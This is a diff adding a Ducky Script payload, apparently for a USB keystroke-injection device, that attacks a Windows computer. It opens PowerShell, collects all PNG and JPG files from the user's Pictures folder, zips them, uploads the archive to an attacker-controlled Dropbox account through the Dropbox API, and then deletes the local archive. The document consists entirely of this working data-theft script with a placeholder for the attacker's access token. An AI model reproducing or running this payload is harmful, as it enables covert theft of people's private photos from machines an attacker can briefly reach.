@@ -1,0 +1,52 @@
+REM You can change which ever path you want to the the pictures/files from.
+REM Change line 32 to your OWN Dropbox access token
+GUI r
+DELAY 250
+STRING powershell
+DELAY 300
+ENTER
+DELAY 500
+STRING Set-WinUserLanguageList -Force en-US
+DELAY 100
+ENTER
+DELAY 250
+STRING mkdir $env:TEMP\bildes -Force
+ENTER
+REM get pictures from the specified path recursivly and copy them to the previously made directory
+DELAY 400
+STRING Get-ChildItem -Path C:\Users\$env:Username\Pictures -Recurse -Include *.png, *.jpg | Copy-Item -Destination $env:TEMP\bildes -PassThru -Force
+ENTER
+DELAY 1000
+STRING Compress-Archive -Path $env:TEMP\Bildes -CompressionLevel NoCompression -DestinationPath $env:TEMP\bildes.zip -Force
+ENTER
+DELAY 2000
+STRING $TargetFilePath="/bildes.zip"
+ENTER
+DELAY 200
+STRING $SourceFilePath="$env:TEMP\bildes.zip"
+ENTER
+DELAY 200
+STRING $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false, "strict_conflict": false }'
+ENTER
+DELAY 200
+STRING $authorization = "Bearer " + "PUT HERE YOUR ACCESS TOKEN FROM YOUR DROP BOX APPLICATION, DON'T FORGET TO GIVE THE APPLICATION WRITE PERMISSION OR IT WONT WORK"
+ENTER
+DELAY 200
+STRING $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+ENTER
+DELAY 200
+STRING $headers.Add("Authorization", $authorization)
+ENTER
+DELAY 200
+STRING $headers.Add("Dropbox-API-Arg", $arg)
+ENTER
+DELAY 200
+STRING $headers.Add("Content-Type", 'application/octet-stream')
+ENTER
+DELAY 200
+STRING Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+ENTER
+DELAY 5000
+STRING rm $SourceFilePath
+ENTER
+DELAY 300
